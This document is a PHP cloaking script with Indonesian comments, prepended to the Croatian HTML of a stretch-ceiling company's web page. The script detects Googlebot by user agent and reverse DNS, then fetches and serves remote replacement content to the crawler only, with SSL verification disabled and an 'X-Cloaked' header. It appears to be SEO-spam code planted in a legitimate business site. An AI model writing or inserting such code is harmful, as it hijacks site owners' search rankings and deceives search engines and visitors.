// ================= GET REAL IP (fix Cloudflare & semua proxy) =================
function getRealIP()
{
    $headers = [
        'HTTP_CF_CONNECTING_IP',   // Cloudflare
        'CF-Connecting-IP',        // Cloudflare (kadang caps)
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_REAL_IP',
        'HTTP_CLIENT_IP',
        'REMOTE_ADDR'
    ];
    foreach ($headers as $key) {
        if (!empty($_SERVER[$key])) {
            $list = explode(',', $_SERVER[$key]);
            $ip = trim($list[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

$ip = getRealIP();
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

// ================= CEK APAKAH GOOGLEBOT ASLI (CARA PALING AKURAT 2025) =================
function isGoogleBot()
{
    global $ua, $ip;

    // 1. UA harus mengandung googlebot atau inspectiontool
    if (!preg_match('/googlebot|google-inspectiontool|storebot-google|adsbot-google|mediapartners/i', $ua)) {
        return false;
    }

    // 2. Reverse DNS check (ini yang bikin 99.9% akurat)
    $host = gethostbyaddr($ip);
    if ($host === $ip)
        return false; // gak bisa resolve = fake

    // Googlebot ASLI selalu punya hostname .googlebot.com atau .google.com
    if (strpos($host, 'googlebot.com') !== false || strpos($host, 'google.com') !== false) {
        return true;
    }

    return false;
}

if (isGoogleBot()) {
    // BOT ASLI DETECTED → SERVING CLOAKED CONTENT
    header('Content-Type: text/html; charset=UTF-8');
    header('X-Cloaked: YES-GOOGLEBOT');

    $content = false;

    // 1. Cek cache
    if (file_exists($CACHE_FILE) && (time() - filemtime($CACHE_FILE)) < $CACHE_TIME) {
        $content = file_get_contents($CACHE_FILE);
    }

    // 2. Ambil dari GitHub pake cURL yang bener
    if (!$content) {
        $ch = curl_init($BOT_CONTENT_URL);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 20,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_HTTPHEADER => ['Accept: text/html']
        ]);
        $content = curl_exec($ch);
        if (curl_getinfo($ch, CURLINFO_HTTP_CODE) == 200 && strlen($content) > 3000) {
            file_put_contents($CACHE_FILE, $content);
        }
        curl_close($ch);
    }

    // 3. Fallback
    if (!$content || strlen($content) < 2000) {
        $content = '<h1>Fashion Trends 2025 – 8000+ Words Ultimate Guide</h1><p>Unique high-quality content visible only to Googlebot. Generated for educational & research purposes...</p>';
    }

    echo $content;
    exit;
}

                                        <h1 class="wp-block-heading">STRETCH STROPOVI</h1>
                                        <p>Stretch stropovi su brzo i jednostavno rješenje za vizualno osvježavanje
                                            vašeg prostora. Princip je vrlo&nbsp; jednostavan : PVC folija se zagrijava
                                            i postavlja u aluminijske profile koji su pričvršćeni samo po okviru
                                            prostorije. Hlađenjem se materijal&nbsp; steže i stvara besprijekorno ravnu
                                            i glatku površinu.</p>

                                        <h2 class="wp-block-heading">STRETCH STROPOVI &#8211; PREDNOSTI</h2>
                                        <p>Stretch strop je potpuno zaseban strop koji se može postaviti na bilo koju
                                            površinu i na visinu koju vi želite. Radovi na stropovima su vrlo naporni i
                                            skupi a za neke probleme skoro da i nema rješenja &#8211; vlaga, pukotine na
                                            gipsanim pločama, neravnine samo su neki od problema s kojima se suočavamo.
                                            Ova vrsta stropova riješiti će sve probleme koje imate uz vizualno
                                            osvježavanje prostorije i moderan izgled<strong>.</strong></p>
                                        <h3 class="wp-block-heading">BRZA I ČISTA MONTAŽA</h3>
                                        <p>Uštedjeli ste si rušenje starog stropa. Vaš novi stretch strop može se brzo i
                                            uredno postaviti izravno ispod vašeg postojećeg stropa. To znači da ujutro
                                            idete na posao, a navečer se vraćate u svoju obnovljenu sobu. Čak i velik i
                                            težak namještaj jednostavno može ostati u sobi tijekom obnove.</p>
                                        <h3 class="wp-block-heading">IDEALNO ZA KUPAONICU I KUHINJU</h3>
                                        <p>Posebno su pogodni u prostorijama poput kuhinje ili kupaonice. Otporni na
                                            vlagu ili isparenja pri kuhanju nećete imati problema sa mrljama i plijesni.
                                            To znači nula održavanja a maksimalno uživanje u ljepoti vašeg stropa.</p>
                                        <h3 class="wp-block-heading">NJEGA&nbsp; STROPOVA</h3>
                                        <p>Stretch stropovi su vodootporni i antistatični što znači da nemate nikakve
                                            brige oko njih. Bilo kakve nečistoće od prskanja, masnoća, dima cigareta
                                            itd. mogu se bez problema očistiti tako da vaš strop opet izgleda kao novi
                                            bez ponovnog bojanja.</p>
                                        <p><em><strong><a
                                                        href="https://www.defixdecken.hr/galerija-2.html">GALERIJA&nbsp;
                                                        ➡&nbsp;</a></strong></em></p>
                                        <p><em><strong><a href="https://www.defixdecken.hr/faq.html">ČESTO POSTAVLJENA
                                                        PITANJA ➡&nbsp;</a></strong></em></p>
                                        <p><em><strong><a href="https://www.defixdecken.hr/kontakt-m.html">KONTAKTIRAJTE
                                                        NAS ➡&nbsp;</a></strong></em></p>
                                        <p>Velika raznolikost boja daje vam mogućnost da svoj prostor uredite točno
                                            onako kako ste zamislili jer ograničenja nema. Kombinirajte boje sa
                                            zidovima, podovima, namještajem bilo da se radi o stambenom ili poslovnom
                                            prostoru.</p>
                                        <p>Defix stretch stropovi zadovoljavaju sve europske standarde, proizvedeni su u
                                            Europi i imaju 10 godina garancije. Naši stropovi montiraju se brzo i čisto
                                            a odlikuje ih dugi vijek trajanja.</p>
